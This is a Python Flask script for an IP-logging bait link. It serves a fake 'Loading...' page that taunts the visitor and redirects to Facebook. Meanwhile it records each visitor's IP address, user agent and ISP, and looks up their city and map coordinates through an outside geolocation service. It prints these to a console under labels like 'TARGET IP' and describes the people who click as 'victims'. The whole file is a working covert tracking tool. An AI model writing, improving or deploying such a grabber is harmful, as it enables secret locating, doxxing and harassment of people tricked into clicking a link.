import os
import shutil
import requests
import platform
import time
from flask import Flask, request
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)

BANNER = r"""
▒██    ██▒ █     ██  ███▄    █  ██▀███  ▄▄▄█████▓
▒▒ █ █ ▒░ ██  ▓██▒ ██ ▀█   █ ▓██ ▒ ██▒▓  ██▒ ▓▒
░░  █   ░▓██  ▒██░▓██  ▀█ ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░
 ░ █ █ ▒ ▓▓█  ░██░▓██▒  ▐▌██▒▒██▀▀█▄  ░ ▓██▓ ░ 
▒██▒ ▒██▒▒▒█████▓ ▒██░   ▓██░░██▓ ▒██▒  ▒██▒ ░ 
▒▒ ░ ░▓ ░░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░ ▒▓ ░▒▓░  ▒ ░░   
░░   ░▒ ░░░▒░ ░ ░ ░ ░░   ░ ▒░  ░▒ ░ ▒░    ░    
 ░    ░   ░░░ ░ ░    ░   ░ ░   ░░   ░  ░       
 ░    ░     ░              ░    ░              
"""

BAIT_HTML = """
<html>
    <head>
        <title>Loading...</title>
        <style>
            body { background-color: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; padding-top: 15%; }
            .loader { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <h1 style="font-size: 3rem; letter-spacing: 10px;">HI PO HEHEHE</h1>
        <p style="font-size: 1.2rem;">i got your ip hehe </3</p>
        <div class="loader"></div>
        <p>REDIRECTING TO SECURE CONTENT...</p>
        <script>
            setTimeout(function(){ window.location.href = "https://facebook.com"; }, 3000);
        </script>
    </body>
</html>
"""

def get_gradient_color(step, total_steps):
    """Generates an ANSI RGB escape code for a Red-to-Purple gradient."""
    # Red: (255, 0, 0) -> Purple: (128, 0, 128)
    r = int(255 - (127 * (step / total_steps)))
    g = 0
    b = int(128 * (step / total_steps))
    return f"\033[38;2;{r};{g};{b}m"

def print_centered_banner(art):
    term_width = shutil.get_terminal_size().columns
    lines = [line for line in art.splitlines() if line.strip()]
    total_lines = len(lines)
    
    for i, line in enumerate(lines):
        color = get_gradient_color(i, total_lines)
        centered_line = line.strip().center(term_width)
        print(color + centered_line + Style.RESET_ALL)

@app.route('/')
def logger_entry():
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
    else:
        ip = request.remote_addr
        
    ua = request.headers.get('User-Agent')
    loc = f"{Fore.RED}Private/Local IP"
    isp = f"{Fore.RED}N/A"
    map_link = f"{Fore.RED}N/A"

    for _ in range(2):
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}?fields=24857', timeout=10)
            geo_data = response.json()
            if geo_data.get('status') == 'success':
                loc = f"{Fore.GREEN}{geo_data.get('city')}, {geo_data.get('regionName')}, {geo_data.get('country')}"
                isp = f"{Fore.CYAN}{geo_data.get('isp')}"
                lat, lon = geo_data.get('lat'), geo_data.get('lon')
                map_link = f"{Fore.YELLOW}http://google.com/maps?q={lat},{lon}"
                break
        except:
            continue

    # Console Output with Colorama
    print("\n" + Fore.MAGENTA + "═"*70)
    print(Fore.RED + Style.BRIGHT + " [+] 🩸 INCOMING HIT DETECTED")
    print(f" {Fore.WHITE}[>] TARGET IP   : {Fore.YELLOW}{ip}")
    print(f" {Fore.WHITE}[>] LOCATION    : {loc}")
    print(f" {Fore.WHITE}[>] ISP/ORG     : {isp}")
    print(f" {Fore.WHITE}[>] MAP LINK    : {map_link}")
    print(f" {Fore.WHITE}[>] DEVICE      : {Fore.LIGHTBLACK_EX}{ua}")
    print(Fore.MAGENTA + "═"*70)

    return BAIT_HTML

if __name__ == "__main__":
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print_centered_banner(BANNER)
    
    print(Fore.CYAN + f"\n[*] Server starting on Port 80...")
    print(Fore.GREEN + "[*] Logs will appear below as victims click the link.\n")
    
    app.run(host='0.0.0.0', port=80, debug=False)
